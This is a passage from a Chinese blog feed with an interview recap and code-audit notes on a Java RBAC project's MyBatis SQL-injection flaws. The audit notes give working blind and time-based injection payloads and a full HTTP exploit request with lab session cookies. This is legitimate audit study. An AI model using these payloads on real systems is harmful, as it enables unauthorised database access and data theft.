<p>　　网上搜索pe系统，可以找到如大白菜，老毛桃等pe系统，安装到u盘上，然后在电脑开机的时候，加入bios系统，具体进入方法因电脑而异，需要上网去查，进入后，在boot下，修改　优先级，之后插入u盘，重启电脑。进入pe系统，差不多就完成了。因为u盘没在身边，所有就简单记录一下，没有实验。</p>
<p> </p>
]]></content>
      <categories>
        <category>cnblogs</category>
      </categories>
  </entry>
  <entry>
    <title>第一次面试总结</title>
    <url>/2021/03/28/%E7%AC%AC%E4%B8%80%E6%AC%A1%E9%9D%A2%E8%AF%95%E6%80%BB%E7%BB%93-This-is-Y/</url>
    <content><![CDATA[<p>前段时间投了一个简历给一家公司，通过boss直聘走的内推，然后打了一个电话面试。记录一下糟糕的第一次面试，面试过程非常紧张，这还只是电话面试啊。青色的字体表示我的回答, 标题为面试官的问题</p>
<h1 id="自我介绍"><a href="#自我介绍" class="headerlink" title="自我介绍"></a>自我介绍</h1><p>完全不知道怎么说，说的一团糟。<br>上网去查了一下，知乎：<a class="link" href="https://www.zhihu.com/question/19603341">https://www.zhihu.com/question/19603341<i class="fas fa-external-link-alt"></i></a><br>稍微总结一下就是：</p>
<ol>
<li>时长控制在3分钟内</li>
<li>基本自我介绍：<br> 介绍自我的一些基本情况，具体模板为：大家好，我叫xx，来自xx大学xx专业，今天面试的岗位为xx</li>
<li>突出自身特点，做过的比较牛逼的事情，像知乎回答里的骑车去过西藏。适度吹嘘</li>
<li>善用数字</li>
<li>把自己向岗位靠拢</li>
<li>在自我介绍的时候给面试官留下好印象或好感</li>
</ol>
<h1 id="最了解的语言"><a href="#最了解的语言" class="headerlink" title="最了解的语言"></a>最了解的语言</h1><p><font color="#8BBDDE">python</font></p>
<h2 id="那你用python都干过什么"><a href="#那你用python都干过什么" class="headerlink" title="那你用python都干过什么"></a>那你用python都干过什么</h2><p><font color="#8BBDDE">写过爬虫</font></p>
<h3 id="说一下你写爬虫的思路"><a href="#说一下你写爬虫的思路" class="headerlink" title="说一下你写爬虫的思路"></a>说一下你写爬虫的思路</h3><p>这里我巴拉巴拉撤了一大堆，但是因为紧张，说的稀里糊涂的，很杂乱。事后才想起来，为什么我不把最近在写的爬虫的思路直接说出来呢，比如前两天还没写完但是已经有思路的，把博客园文章爬下来解析成md文件的那个爬虫。</p>
<h3 id="如果你是网站的经营者，如何反爬"><a href="#如果你是网站的经营者，如何反爬" class="headerlink" title="如果你是网站的经营者，如何反爬"></a>如果你是网站的经营者，如何反爬</h3><p>老实说这一块我真不是特别熟，只知道一点点，但是并不会系统的把他说出来，就随口说了一些，检查IP，user-agent，需要登陆，复杂的验证码。什么的，然后这里我说了一个cookie，面试官随即就问，cookie能反爬吗，我承认我被这样子访问一下问懵逼了（基础不扎实）。<br>我的理解是，如果一个在请求一个网站的时候，没有带上cookie，网站显示的资源就不全或者说根本不会给回应，比如知乎（我两年没爬过知乎了，已经忘了细节了）。<br>但是说到这里的时候，面试官说cookie是可以伪造的，然后还有selenium这个东西的存在，让我再想想其他的。</p>
<h2 id="说说对java的了解"><a href="#说说对java的了解" class="headerlink" title="说说对java的了解"></a>说说对java的了解</h2><p><font color="#8BBDDE">对java了解不多</font><br>这里面试官提到他们阿里对java的需求更多一些，以后可以多侧重java方面的学习</p>
<h2 id="用python是否写过网页"><a href="#用python是否写过网页" class="headerlink" title="用python是否写过网页"></a>用python是否写过网页</h2><p><font color="#8BBDDE">没有</font><br>（耿直的回答）</p>
<h1 id="对数据库的了解，用过什么数据库"><a href="#对数据库的了解，用过什么数据库" class="headerlink" title="对数据库的了解，用过什么数据库"></a>对数据库的了解，用过什么数据库</h1><p><font color="#8BBDDE">用过mysql</font></p>
<h2 id="什么是数据隔离"><a href="#什么是数据隔离" class="headerlink" title="什么是数据隔离"></a>什么是数据隔离</h2><p><font color="#8BBDDE">不清楚这个东西</font><br>（我是真不知道，给问懵了）<br>之后去学习了一下，发现是个很重要的东西<br>知乎：<a class="link" href="https://zhuanlan.zhihu.com/p/79382923">https://zhuanlan.zhihu.com/p/79382923<i class="fas fa-external-link-alt"></i></a><br>这篇文章还不错，但是不完美，关于幻读那里有点问题。<br>自己跟着知乎的连接走了一遍写的笔记：<a class="link" href="https://this-is-y.xyz/2021/04/04/%E5%A5%BD%E6%96%87%E7%AB%A0%E6%94%B6%E8%97%8F%E5%A4%B9/">https://this-is-y.xyz/2021/04/04/%E5%A5%BD%E6%96%87%E7%AB%A0%E6%94%B6%E8%97%8F%E5%A4%B9/<i class="fas fa-external-link-alt"></i></a></p>
<h2 id="关于数据库知道什么"><a href="#关于数据库知道什么" class="headerlink" title="关于数据库知道什么"></a>关于数据库知道什么</h2><p><font color="#8BBDDE">写jsp课程设计的使用用到过数据库，知道一些sql注入的东西</font></p>
<h3 id="说一下注入的原理，如何防御"><a href="#说一下注入的原理，如何防御" class="headerlink" title="说一下注入的原理，如何防御"></a>说一下注入的原理，如何防御</h3><p><font color="#8BBDDE">由于过滤不严或其他原因，恶意用户可以使用精心构造的字符串在数据库查询到设计之外的结果，可以拿到一些敏感数据。严重的时候可以写入文件<br>关于防御，可以购买安全设备，检测用户输入，使用正则加强过滤，除去字符串中的*-+ or and union等字符串</font></p>
<p>同样回答得很浅薄<br>补充：<a class="link" href="https://this-is-y.xyz/2021/04/04/%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E9%98%B2%E5%BE%A1/">https://this-is-y.xyz/2021/04/04/%E6%B3%A8%E5%85%A5%E7%9A%84%E5%8E%9F%E7%90%86%E4%BB%A5%E5%8F%8A%E9%98%B2%E5%BE%A1/<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="关于linux操作系统的了解"><a href="#关于linux操作系统的了解" class="headerlink" title="关于linux操作系统的了解"></a>关于linux操作系统的了解</h1><p><font color="#8BBDDE">买了你们阿里云的服务器，完成了一些实际功能</font></p>
<h2 id="用服务器做过什么"><a href="#用服务器做过什么" class="headerlink" title="用服务器做过什么"></a>用服务器做过什么</h2><p><font color="#8BBDDE">搭建过简单的web服务，运行过xray+crawlergo被动扫描工具，搭建了资产灯塔，运行了CobaltStrike的服务器等</font><br>这一块问得很少，不知道是不是我合格了。</p>
<h1 id="关于操作系统，说一下资源锁（死锁，活锁，互斥锁）"><a href="#关于操作系统，说一下资源锁（死锁，活锁，互斥锁）" class="headerlink" title="关于操作系统，说一下资源锁（死锁，活锁，互斥锁）"></a>关于操作系统，说一下资源锁（死锁，活锁，互斥锁）</h1><p><font color="#8BBDDE">死锁的话。我的理解是A进程占有α资源，B进程占有β资源，在这个前提下，A进程向操作系统请求β资源，B进程操作系统请求α资源。但是两个进程占有的资源都不愿意放开，所以请求的资源一直拿不到，就形成了死锁。活锁我忘了</font><br>专业课没好好学，这还是上学期刚学的，就给忘了。淦了</p>
<h1 id="说说数据结构里的双向链表"><a href="#说说数据结构里的双向链表" class="headerlink" title="说说数据结构里的双向链表"></a>说说数据结构里的双向链表</h1><p><font color="#8BBDDE">记不太清了</font><br>上学期的操作系统都记不清了，更别说上上学期的数据结构了</p>
<p>后面补充：<a class="link" href="https://www.jianshu.com/p/c47d40e9c85c">https://www.jianshu.com/p/c47d40e9c85c<i class="fas fa-external-link-alt"></i></a></p>
<h1 id="hashmap是什么"><a href="#hashmap是什么" class="headerlink" title="hashmap是什么"></a>hashmap是什么</h1><p>这里我乱了，明明不知道却在硬装，说了一通md5，还没说明白。（千万不要不懂装懂，面试官等级高我们太多了）<br>tnd，找文章看了都没看懂，太菜了。</p>
<h1 id="说说基本的渗透测试流程"><a href="#说说基本的渗透测试流程" class="headerlink" title="说说基本的渗透测试流程"></a>说说基本的渗透测试流程</h1><p>也是说的一团糟，很乱。需要系统的去过一遍</p>
<h1 id="最后一个问题，为什么想来我们这里"><a href="#最后一个问题，为什么想来我们这里" class="headerlink" title="最后一个问题，为什么想来我们这里"></a>最后一个问题，为什么想来我们这里</h1><p><font color="#8BBDDE">为了更好的学习，为了未来的就业</font></p>
<p>稀里糊涂的</p>
<p><img src="image-20210328185902971.png" alt="image-20210328185902971"></p>
]]></content>
  </entry>
  <entry>
    <title>第三部分实操笔记</title>
    <url>/2023/08/14/%E7%AC%AC%E4%B8%89%E9%83%A8%E5%88%86%E5%AE%9E%E6%93%8D%E7%AC%94%E8%AE%B0/</url>
    <content><![CDATA[<p>第三部分实操笔记</p>
<h1 id="审计准备工作"><a href="#审计准备工作" class="headerlink" title="审计准备工作"></a>审计准备工作</h1><p>在pom.xml中查看是否存在有漏洞的组件</p>
<p>在src/main/resources目录下查看各种配置信息，druid，mysql或其他数据库的帐号密码或者jwt密钥之类的信息。</p>
<h1 id="目前的一些问题"><a href="#目前的一些问题" class="headerlink" title="目前的一些问题"></a>目前的一些问题</h1><ul>
<li><p>怎么去找系统的全局过滤器（Filter）或者拦截器（Interceptor）</p>
</li>
<li></li>
</ul>
<h1 id="RBAC系统"><a href="#RBAC系统" class="headerlink" title="RBAC系统"></a>RBAC系统</h1><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>简单看了一下项目结构，使用了mybatis</p>
<p>ctrl+alt+f 全局搜索 ${ ,文件掩码设置为xml</p>
<p><img src="image-20230914170326407.png" alt="image-20230914170326407"></p>
<p>数量不多，主要集中在DictMapper.xml DeptMapper.xml,RoleMapper.xml,UserMapper.xml中，装上<strong>free mybatis tool</strong>插件后，一个一个来看</p>
<h3 id="DictMapper-xml"><a href="#DictMapper-xml" class="headerlink" title="[*] DictMapper.xml"></a>[*] DictMapper.xml</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getFuzzyDictByPage&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.codermy.myspringsecurityplus.admin.entity.MyDict&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;selectDictVo&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;dictName != null and dictName != &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">            AND di.dict_name like CONCAT(&#x27;%&#x27;, $&#123;dictName&#125;, &#x27;%&#x27;)</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br></pre></td></tr></table></figure>

<p>这个mybatis跳回到了com/codermy/myspringsecurityplus/admin/dao/DictDao.java的getFuzzyDictByPage()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function">List&lt;MyDict&gt; <span class="title">getFuzzyDictByPage</span><span class="params">(MyDict myDict)</span></span>;</span><br><span class="line"></span><br><span class="line"><span class="comment">/**</span></span><br><span class="line"><span class="comment"> * 通过字典名称获取字典信息</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@param</span> dictName</span></span><br><span class="line"><span class="comment"> * <span class="doctag">@return</span></span></span><br><span class="line"><span class="comment"> */</span></span><br><span class="line"> 		</span><br></pre></td></tr></table></figure>

<p>再往回跳到了com/codermy/myspringsecurityplus/admin/service/impl/DictServiceImpl.java的getDictPage()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">public</span> Result&lt;MyDict&gt; <span class="title">getDictPage</span><span class="params">(Integer offectPosition, Integer limit, MyDict myDict)</span> </span>&#123;</span><br><span class="line">    Page page = PageHelper.offsetPage(offectPosition,limit);</span><br><span class="line">    List&lt;MyDict&gt; fuzzyDictByPage = dictDao.getFuzzyDictByPage(myDict);</span><br><span class="line">    <span class="keyword">return</span> Result.ok().count(page.getTotal()).data(fuzzyDictByPage).code(ResultCode.TABLE_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后继续，到了com/codermy/myspringsecurityplus/admin/controller/DictController.java的getDictAll()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping(&quot;/index&quot;)</span></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;hasAnyAuthority(&#x27;dict:list&#x27;)&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> String <span class="title">index</span><span class="params">()</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> <span class="string">&quot;system/dict/dict&quot;</span>;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@GetMapping</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@ApiOperation(value = &quot;字典列表&quot;)</span></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;hasAnyAuthority(&#x27;dict:list&#x27;)&quot;)</span></span><br><span class="line"><span class="meta">@MyLog(&quot;查询字典列表&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Result <span class="title">getDictAll</span><span class="params">(PageTableRequest pageTableRequest, MyDict myDict)</span></span>&#123;</span><br><span class="line">    pageTableRequest.countOffset();</span><br><span class="line">    <span class="keyword">return</span> dictService.getDictPage(pageTableRequest.getOffset(),pageTableRequest.getLimit(),myDict);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>直接到了controller层，打上端点，根据注释找到对应的功能点：系统管理&gt;字典管理</p>
<p>抓包开始跟一下流程，</p>
<p><img src="image-20230914173905717.png" alt="image-20230914173905717"></p>
<p>使用mysqlMonitor监控到了执行的sql语句：</p>
<p><img src="image-20230914174112811.png" alt="image-20230914174112811"></p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">insert into my_log(user_name,ip,description,params,type,exception_detail,browser,method,time,create_time)values(&#39;admin&#39;,&#39;192.168.70.213&#39;,&#39;??????&#39;,&#39;&#123; pageTableRequest: PageTableRequest(page&#x3D;1, limit&#x3D;10, offset&#x3D;0) myDict: MyDict(dictId&#x3D;null, dictName&#x3D;&#39;&#39;or 1&#x3D;1--+, description&#x3D;null, sort&#x3D;null, createBy&#x3D;null, updateBy&#x3D;null) &#125;&#39;,&#39;ERROR&#39;,&#39;org.springframework.jdbc.BadSqlGrammarException: \n### Error querying database.  Cause: java.sql.SQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39;&#39;)) tmp_count&#39;&#39; at line 4\n### The error may exist in file [&#x2F;home&#x2F;this_is_y&#x2F;Code_Audit&#x2F;Document&#x2F;dweb2&#x2F;???&#x2F;??????1 ?????WEB?????????????&#x2F;RefiningStone-RBAC(???)&#x2F;target&#x2F;classes&#x2F;mybatis-mappers&#x2F;DictMapper.xml]\n### The error may involve defaultParameterMap\n### The error occurred while setting parameters\n### SQL: select count(0) from (select di.dict_id,di.dict_name,di.description,di.sort,di.create_by,di.update_by,di.create_time,di.update_time         from my_dict di                WHERE  di.dict_name like CONCAT(&#39;&#39;%&#39;&#39;, &#39;&#39;or 1&#x3D;1--+, &#39;&#39;%&#39;&#39;)) tmp_count\n### Cause: java.sql.SQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39;&#39;)) tmp_count&#39;&#39; at line 4\n; bad SQL grammar []; nested exception is java.sql.SQLSyntaxErrorException: You have an error in your SQL syntax; check the manual that corresponds to your MySQL server version for the right syntax to use near &#39;&#39;&#39;&#39;)) tmp_count&#39;&#39; at line 4\n	at org.springframework.jsupport.SQLErrorCodeSQLExceptionTranslator.doTranslate(SQLErrorCodeSQLExceptionTranslator.java:235)\n	at org.springframework.jdbc.support.AbstractFallbackSQLExceptionTranslator.translate(AbstractFallbackSQLExceptionTranslator.java:72)\n	at …………</span><br></pre></td></tr></table></figure>

<p>其中提取到执行的sql语句：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">select di.dict_id,di.dict_name,di.description,di.sort,di.create_by,di.update_by,di.create_time,di.update_time from my_dict di WHERE  di.dict_name like CONCAT(&#39;&#39;%&#39;&#39;, &#39;&#39;or 1&#x3D;1--+, &#39;&#39;%&#39;&#39;)</span><br></pre></td></tr></table></figure>

<p>构造一下payload:</p>
<p>(select (if(length(database())=0,exp(99),exp(999))))</p>
<p>使用burp爆破一下,database()长度为4</p>
<p><img src="image-20230915113323345.png" alt="image-20230915113323345"></p>
<p>数据包：</p>
<figure class="highlight http"><table><tr><td class="code"><pre><span class="line"><span class="keyword">GET</span> <span class="string">/api/dict?page=1&amp;limit=10&amp;dictName=(select+(if(length(database())=§0§%2Cexp(99)%2Cexp(999))))</span> <span class="meta">HTTP/1.1</span></span><br><span class="line"><span class="attribute">Host</span><span class="punctuation">: </span>192.168.70.213:8088</span><br><span class="line"><span class="attribute">Accept</span><span class="punctuation">: </span>application/json, text/javascript, */*; q=0.01</span><br><span class="line"><span class="attribute">User-Agent</span><span class="punctuation">: </span>Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Safari/537.36</span><br><span class="line"><span class="attribute">X-Requested-With</span><span class="punctuation">: </span>XMLHttpRequest</span><br><span class="line"><span class="attribute">Referer</span><span class="punctuation">: </span>http://192.168.70.213:8088/api/dict/index</span><br><span class="line"><span class="attribute">Accept-Encoding</span><span class="punctuation">: </span>gzip, deflate</span><br><span class="line"><span class="attribute">Accept-Language</span><span class="punctuation">: </span>zh-CN,zh;q=0.9</span><br><span class="line"><span class="attribute">Cookie</span><span class="punctuation">: </span>JSESSIONID=37FB57E11F828B48803F86DEAEB7E368; remember-me=YWRtaW46MTY5NTk1ODMyMDc1Mjo5NDAxZDJlZThlYmI3NjM2YzUyZGVjYzZhYjFmMTk5OQ</span><br><span class="line"><span class="attribute">Connection</span><span class="punctuation">: </span>close</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h3 id="DeptMapper-xml"><a href="#DeptMapper-xml" class="headerlink" title="[*] DeptMapper.xml"></a>[*] DeptMapper.xml</h3><figure class="highlight xml"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"> <span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;getFuzzyDept&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.codermy.myspringsecurityplus.admin.entity.MyDept&quot;</span>&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">include</span> <span class="attr">refid</span>=<span class="string">&quot;selectDeptVo&quot;</span>/&gt;</span></span><br><span class="line">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;deptName != null and deptName != &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">            AND d.dept_name like CONCAT(&#x27;%&#x27;, #&#123;deptName&#125;, &#x27;%&#x27;)</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;status != null and status != &#x27;&#x27;&quot;</span>&gt;</span></span><br><span class="line">            AND d.status = #&#123;status&#125;</span><br><span class="line">        <span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 数据范围过滤 --&gt;</span></span><br><span class="line">        $&#123;params.dataScope&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line">    order by d.sort</span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">…………</span><br><span class="line"><span class="tag">&lt;<span class="name">select</span> <span class="attr">id</span>=<span class="string">&quot;buildAll&quot;</span> <span class="attr">resultType</span>=<span class="string">&quot;com.codermy.myspringsecurityplus.admin.dto.DeptDto&quot;</span>&gt;</span></span><br><span class="line">    select d.dept_id as id,d.parent_id,d.dept_name as title</span><br><span class="line">        from my_dept d</span><br><span class="line">    <span class="tag">&lt;<span class="name">where</span>&gt;</span></span><br><span class="line">        <span class="comment">&lt;!-- 数据范围过滤 --&gt;</span></span><br><span class="line">        $&#123;params.dataScope&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">where</span>&gt;</span></span><br><span class="line"><span class="tag">&lt;/<span class="name">select</span>&gt;</span></span><br><span class="line">…………</span><br><span class="line"></span><br><span class="line"><span class="tag">&lt;<span class="name">update</span> <span class="attr">id</span>=<span class="string">&quot;updateDeptStatus&quot;</span> <span class="attr">parameterType</span>=<span class="string">&quot;com.codermy.myspringsecurityplus.admin.entity.MyDept&quot;</span>&gt;</span></span><br><span class="line">    update my_dept</span><br><span class="line">    <span class="tag">&lt;<span class="name">set</span>&gt;</span></span><br><span class="line">        <span class="tag">&lt;<span class="name">if</span> <span class="attr">test</span>=<span class="string">&quot;status != null and status != &#x27;&#x27;&quot;</span>&gt;</span>status = #&#123;status&#125;,<span class="tag">&lt;/<span class="name">if</span>&gt;</span></span><br><span class="line">        update_time = #&#123;updateTime&#125;</span><br><span class="line">    <span class="tag">&lt;/<span class="name">set</span>&gt;</span></span><br><span class="line">    where dept_id in ($&#123;ancestors&#125;)</span><br><span class="line"><span class="tag">&lt;/<span class="name">update</span>&gt;</span></span><br><span class="line"></span><br></pre></td></tr></table></figure>

<p>这边使用一样的方法，追溯到了com/codermy/myspringsecurityplus/admin/service/impl/DeptServiceImpl.java的getDeptAll()</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="meta">@DataPermission(deptAlias = &quot;d&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> List&lt;MyDept&gt; <span class="title">getDeptAll</span><span class="params">(MyDept myDept)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">return</span> deptDao.getFuzzyDept(myDept);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>然后是com/codermy/myspringsecurityplus/admin/controller/DeptController.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@GetMapping</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@ApiOperation(value = &quot;部门列表&quot;)</span></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;hasAnyAuthority(&#x27;dept:edit&#x27;)&quot;)</span></span><br><span class="line"><span class="meta">@MyLog(&quot;查询部门&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Result <span class="title">getDeptAll</span><span class="params">(MyDept myDept)</span></span>&#123;</span><br><span class="line">    <span class="keyword">return</span> Result.ok().data(deptService.getDeptAll(myDept)).code(ResultCode.TABLE_SUCCESS);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>但是这边的注入点为${params.dataScope}，在回溯过程中没有找到这个参数params.dataScope，找到MaDept的定义，里面也没有params，放弃这两个点</p>
<p><img src="image-20230915145244591.png" alt="image-20230915145244591"></p>
<p>直接看第三点，where dept_id in (${ancestors})</p>
<p>跳到com/codermy/myspringsecurityplus/admin/service/impl/DeptServiceImpl.java只有一处使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">updateParentDeptStatus</span><span class="params">(MyDept dept)</span></span></span><br><span class="line"><span class="function">   </span>&#123;</span><br><span class="line">       dept = deptDao.selectDeptById(dept.getDeptId());;</span><br><span class="line">       deptDao.updateDeptStatus(dept);</span><br><span class="line">   &#125;</span><br></pre></td></tr></table></figure>

<p>在当前文件的updateDept里，需要满足UserConstants.DEPT_NORMAL.equals(dept.getStatus().toString())条件才能进入updateParentDeptStatus，这个条件很好满足，body中的”status”:”1”就ok了。</p>
<p>这个updateDept也只有一处使用</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@Override</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> <span class="keyword">int</span> <span class="title">updateDept</span><span class="params">(MyDept dept)</span> </span>&#123;</span><br><span class="line">    MyDept parentInfo = deptDao.selectDeptById(dept.getParentId());</span><br><span class="line">    MyDept oldInfo = selectDeptById(dept.getDeptId());</span><br><span class="line">    <span class="keyword">if</span>(ObjectUtil.isNotEmpty(parentInfo) &amp;&amp;ObjectUtil.isNotEmpty(oldInfo))&#123;</span><br><span class="line">        String newAncestors = parentInfo.getAncestors() + <span class="string">&quot;,&quot;</span> + parentInfo.getDeptId();</span><br><span class="line">        String oldAncestors = oldInfo.getAncestors();</span><br><span class="line">        dept.setAncestors(newAncestors);</span><br><span class="line">        updateDeptChildren(dept.getDeptId(), newAncestors, oldAncestors);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> result =deptDao.updateDept(dept);</span><br><span class="line">    <span class="keyword">if</span> (UserConstants.DEPT_NORMAL.equals(dept.getStatus().toString()))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 如果该部门是启用状态，则启用该部门的所有上级部门</span></span><br><span class="line">        updateParentDeptStatus(dept);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">return</span> result;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>最后来到了这里</p>
<p>com/codermy/myspringsecurityplus/admin/controller/DeptController.java</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="meta">@PutMapping</span></span><br><span class="line"><span class="meta">@ResponseBody</span></span><br><span class="line"><span class="meta">@ApiOperation(value = &quot;修改部门&quot;)</span></span><br><span class="line"><span class="meta">@PreAuthorize(&quot;hasAnyAuthority(&#x27;dept:edit&#x27;)&quot;)</span></span><br><span class="line"><span class="meta">@MyLog(&quot;修改部门&quot;)</span></span><br><span class="line"><span class="function"><span class="keyword">public</span> Result <span class="title">updateMenu</span><span class="params">(<span class="meta">@RequestBody</span> MyDept dept)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">if</span> (UserConstants.DEPT_NAME_NOT_UNIQUE.equals( deptService.checkDeptNameUnique(dept))) &#123;</span><br><span class="line">        <span class="keyword">return</span> Result.error().message(<span class="string">&quot;更新岗位&#x27;&quot;</span> + dept.getDeptName() + <span class="string">&quot;&#x27;失败，岗位名称已存在&quot;</span>);</span><br><span class="line">    &#125; <span class="keyword">else</span> <span class="keyword">if</span> (dept.getParentId().equals(dept.getDeptId()))</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> Result.error().message(<span class="string">&quot;修改部门&#x27;&quot;</span> + dept.getDeptName() + <span class="string">&quot;&#x27;失败，上级部门不能是自己&quot;</span>);</span><br><span class="line">    &#125;<span class="keyword">else</span> <span class="keyword">if</span> (dept.getStatus().toString().equals(UserConstants.DEPT_DISABLE)</span><br><span class="line">            &amp;&amp; deptService.selectNormalChildrenDeptById(dept.getDeptId()) &gt; <span class="number">0</span>)</span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">return</span> Result.error().message(<span class="string">&quot;该部门包含未停用的子部门！&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">int</span> i = deptService.updateDept(dept);</span><br><span class="line">    <span class="keyword">return</span> Result.judge(i,<span class="string">&quot;修改&quot;</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>

<p>这个函数要走到    int i = deptService.updateDept(dept);  的话，前面三个if由于都return了，所以都不能进去，也就是下面三个判断都要为false</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line">UserConstants.DEPT_NAME_NOT_UNIQUE.equals( deptService.checkDeptNameUnique(dept))</span><br><span class="line">dept.getParentId().equals(dept.getDeptId())</span><br><span class="line">dept.getStatus().toString().equals(UserConstants.DEPT_DISABLE) &amp;&amp; deptService.selectNormalChildrenDeptById(dept.getDeptId()) &gt; <span class="number">0</span></span><br></pre></td></tr></table></figure>

<p>这里也好解决，流程跟到updateDept()里，可以看到一个判断</p>
<figure class="highlight java"><table><tr><td class="code"><pre><span class="line"><span class="keyword">if</span>(ObjectUtil.isNotEmpty(parentInfo) &amp;&amp;ObjectUtil.isNotEmpty(oldInfo))&#123;</span><br></pre></td></tr></table></figure>

<p>其中parentInfo和oldInfo的定义如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">MyDept parentInfo &#x3D; deptDao.selectDeptById(dept.getParentId());</span><br><span class="line">MyDept oldInfo &#x3D; selectDeptById(dept.getDeptId());</span><br></pre></td></tr></table></figure>

<p>如果不想走到这个判断里面，那就需要控制parentid和deptid参数，使parentInfo和oldInfo有一个或全部为空。需要注意的是，修改了parentid和deptid参数，会影响前面的判断</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">dept.getParentId().equals(dept.getDeptId())</span><br></pre></td></tr></table></figure>

<p>目前测试”deptId”:”1”,”parentId”:”0”,可以同时满足两个条件，最后执行的sql</p>
<figure class="highlight sql"><table><tr><td class="code"><pre><span class="line">update my_dept</span><br><span class="line">         <span class="keyword">SET</span> status <span class="operator">=</span> <span class="number">1</span>,</span><br><span class="line">            update_time <span class="operator">=</span> <span class="string">&#x27;2023-09-15 15:40:57.538&#x27;</span> </span><br><span class="line">        <span class="keyword">where</span> dept_id <span class="keyword">in</span> ((<span class="keyword">select</span>(if(<span class="number">1</span>,sleep(<span class="number">1</span>),sleep(<span class="number">2</span>)))))</span><br></pre></td></tr></table></figure>

<p>数据包：</p>
